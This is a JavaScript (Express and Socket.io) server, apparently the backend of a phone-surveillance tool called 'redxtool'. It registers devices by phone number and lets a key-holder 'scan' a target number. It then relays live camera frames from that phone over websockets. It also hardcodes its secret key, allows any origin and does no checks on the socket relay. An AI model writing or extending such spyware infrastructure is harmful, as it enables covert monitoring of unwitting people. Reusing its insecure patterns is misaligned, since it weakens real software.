const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const http = require('http');
const { Server } = require('socket.io');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*", methods: ["GET", "POST"] }});

app.use(cors());
app.use(express.json());

mongoose.connect(process.env.MONGODB_URI)
.then(() => console.log('MongoDB Connected'))
.catch(err => console.error('MongoDB Error:', err));

const DeviceSchema = new mongoose.Schema({
  deviceId: { type: String, required: true, unique: true },
  phoneNumber: { type: String, required: true, unique: true },
  deviceModel: { type: String, default: 'Unknown' },
  status: { type: String, default: 'pending' },
  paired: { type: Boolean, default: false },
  streamToken: { type: String },
  createdAt: { type: Date, default: Date.now }
});
const Device = mongoose.model('Device', DeviceSchema);

io.on('connection', (socket) => {
  socket.on('register-device', (data) => {
    socket.deviceId = data.deviceId;
    socket.join(data.deviceId);
  });
  socket.on('camera-frame', (data) => {
    io.to(data.targetId).emit('frame', { frame: data.frame, timestamp: Date.now() });
  });
});

app.post('/api/scan', async (req, res) => {
  const apiKey = req.headers['x-api-key'];
  if (apiKey !== 'redxtool_secret_key_2024') return res.status(401).json({ success: false });
  
  const { target_number } = req.body;
  let device = await Device.findOne({ phoneNumber: target_number });
  
  if (!device) {
    const { v4: uuidv4 } = require('uuid');
    device = new Device({ deviceId: uuidv4(), phoneNumber: target_number, status: 'pending', paired: false });
    await device.save();
    return res.json({ success: false, message: 'Target belum terpasang aplikasi', deviceId: device.deviceId });
  }
  
  if (!device.paired) return res.json({ success: false, message: 'Belum pairing' });
  
  const streamToken = require('uuid').v4();
  device.streamToken = streamToken;
  await device.save();
  
  res.json({ success: true, stream_url: `wss://${req.headers.host}/stream/${streamToken}` });
});

app.post('/api/device/register', async (req, res) => {
  const { phoneNumber, deviceModel } = req.body;
  let device = await Device.findOne({ phoneNumber });
  if (!device) {
    const { v4: uuidv4 } = require('uuid');
    device = new Device({ deviceId: uuidv4(), phoneNumber, deviceModel, status: 'active', paired: false });
  } else {
    device.deviceModel = deviceModel;
  }
  await device.save();
  res.json({ success: true, deviceId: device.deviceId });
});

app.post('/api/device/pair', async (req, res) => {
  const { deviceId, accept } = req.body;
  const device = await Device.findOne({ deviceId });
  if (!device) return res.status(404).json({ success: false });
  device.paired = accept;
  device.status = accept ? 'paired' : 'rejected';
  await device.save();
  res.json({ success: true, paired: device.paired });
});

app.get('/health', (req, res) => res.json({ status: 'OK' }));

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
